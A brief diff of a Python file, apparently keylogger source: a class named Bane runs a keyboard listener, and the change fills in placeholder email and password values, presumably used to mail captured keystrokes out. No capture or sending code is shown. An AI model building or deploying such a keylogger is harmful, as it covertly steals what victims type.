@@ -80,8 +80,8 @@ class Bane():
              keyboard_listener.join()
              
    
-email_address = ""
-password = ""
+email_address = "YOUR MAIL"
+password = "YOUR PASSWORD"
 
 
 
